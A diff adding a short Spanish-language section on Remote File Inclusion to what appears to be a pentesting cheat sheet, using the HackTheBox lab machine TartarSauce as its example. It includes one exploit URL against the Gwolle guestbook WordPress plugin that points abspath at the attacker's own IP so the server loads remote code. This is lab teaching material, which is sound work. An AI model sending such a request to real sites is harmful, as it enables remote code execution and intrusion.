@@ -926,6 +926,15 @@ Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer
 
 #### RFI
 
+Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.
+
+Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:
+
+`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
+path=http://nuestraIP/wp-load.php`
+
+De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
+
 ### Pentesting Linux
 
 ### Pentesting Windows
